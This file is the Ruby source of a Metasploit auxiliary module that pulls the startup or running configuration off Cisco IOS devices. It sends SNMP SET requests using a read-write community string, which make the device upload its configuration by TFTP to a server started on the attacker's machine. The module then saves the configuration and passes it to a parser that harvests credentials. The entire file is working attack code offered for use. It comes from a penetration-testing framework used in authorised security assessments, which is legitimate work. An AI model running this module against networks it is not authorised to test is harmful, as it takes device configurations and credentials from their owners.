##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'English'
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SNMPClient
  include Msf::Auxiliary::Cisco
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'Cisco IOS SNMP Configuration Grabber (TFTP)',
      'Description' => %q{
          This module will download the startup or running configuration
        from a Cisco IOS device using SNMP and TFTP. A read-write SNMP
        community is required. The SNMP community scanner module can
        assist in identifying a read-write community. The target must
        be able to connect back to the Metasploit system and the use of
        NAT will cause the TFTP transfer to fail.
      },
      'Author' => [
        'pello <fropert[at]packetfault.org>',
        'hdm'
      ],
      'License' => MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => []
      }
    )
    register_options([
      OptEnum.new('SOURCE', [true, 'Grab the startup (3) or running (4) configuration', '4', ['3', '4']]),
      OptString.new('OUTPUTDIR', [ false, 'The directory where we should save the configuration files (disabled by default)']),
      OptAddressLocal.new('LHOST', [ false, 'The IP address of the system running this module' ])
    ])
  end

  #
  # Start the TFTP Server
  #
  def setup
    # Setup is called only once
    print_status('Starting TFTP server...')
    @tftp = Rex::Proto::TFTP::Server.new(69, '0.0.0.0', { 'Msf' => framework, 'MsfExploit' => self })
    @tftp.incoming_file_hook = proc { |info| process_incoming(info) }
    @tftp.start
    add_socket(@tftp.sock)

    @main_thread = ::Thread.current

    print_status('Scanning for vulnerable targets...')
  end

  #
  # Kill the TFTP server
  #
  def cleanup
    # Cleanup is called once for every single thread
    if ::Thread.current == @main_thread
      # Wait 5 seconds for background transfers to complete
      print_status('Providing some time for transfers to complete...')
      ::IO.select(nil, nil, nil, 5.0)

      print_status('Shutting down the TFTP service...')
      if @tftp
        begin
          @tftp.close
        rescue StandardError
          nil
        end
        @tftp = nil
      end
    end
  end

  #
  # Callback for incoming files
  #
  def process_incoming(info)
    return if !info[:file]

    name = info[:file][:name]
    data = info[:file][:data]
    from = info[:from]
    return if !(name && data)

    # Trim off IPv6 mapped IPv4 if necessary
    from = from[0].dup
    from.gsub!('::ffff:', '')

    print_status("Incoming file from #{from} - #{name} #{data.length} bytes")

    # Save the configuration file if a path is specified
    if datastore['OUTPUTDIR']
      name = "#{from}.txt"
      ::FileUtils.mkdir_p(datastore['OUTPUTDIR'])
      path = ::File.join(datastore['OUTPUTDIR'], name)
      ::File.open(path, 'wb') do |fd|
        fd.write(data)
      end
      print_status("Saved configuration file to #{path}")
    end

    # Toss the configuration file to the parser
    cisco_ios_config_eater(from, 161, data)
  end

  def run_host(ip)
    source = datastore['SOURCE'].to_i
    protocol = 1
    filename = "#{ip}.txt"
    lhost = datastore['LHOST'] || Rex::Socket.source_address(ip)

    ccconfigcopyprotocol = '1.3.6.1.4.1.9.9.96.1.1.1.1.2.'
    cccopysourcefiletype = '1.3.6.1.4.1.9.9.96.1.1.1.1.3.'
    cccopydestfiletype = '1.3.6.1.4.1.9.9.96.1.1.1.1.4.'
    cccopyserveraddress = '1.3.6.1.4.1.9.9.96.1.1.1.1.5.'
    cccopyfilename = '1.3.6.1.4.1.9.9.96.1.1.1.1.6.'
    cccopyentryrowstatus = '1.3.6.1.4.1.9.9.96.1.1.1.1.14.'

    session = rand(1..255)

    snmp = connect_snmp

    varbind = SNMP::VarBind.new("#{ccconfigcopyprotocol}#{session}", SNMP::Integer.new(protocol))
    snmp.set(varbind)

    # If the above line didn't throw an error, the host is alive and the community is valid
    print_status("Trying to acquire configuration from #{ip}...")

    varbind = SNMP::VarBind.new("#{cccopysourcefiletype}#{session}", SNMP::Integer.new(source))
    snmp.set(varbind)

    varbind = SNMP::VarBind.new("#{cccopydestfiletype}#{session}", SNMP::Integer.new(1))
    snmp.set(varbind)

    varbind = SNMP::VarBind.new("#{cccopyserveraddress}#{session}", SNMP::IpAddress.new(lhost))
    snmp.set(varbind)

    varbind = SNMP::VarBind.new("#{cccopyfilename}#{session}", SNMP::OctetString.new(filename))
    snmp.set(varbind)

    varbind = SNMP::VarBind.new("#{cccopyentryrowstatus}#{session}", SNMP::Integer.new(1))
    snmp.set(varbind)

    varbind = SNMP::VarBind.new("#{cccopyentryrowstatus}#{session}", SNMP::Integer.new(6))
    snmp.set(varbind)
  rescue ::Rex::ConnectionError, ::SNMP::RequestTimeout
    # No need to make noise about timeouts
  rescue ::SNMP::UnsupportedVersion => e
    vprint_error(e.message)
  rescue ::Interrupt
    raise $ERROR_INFO
  rescue ::StandardError => e
    print_error("#{ip} Error: #{e.class} #{e} #{e.backtrace}")
  ensure
    disconnect_snmp
  end
end
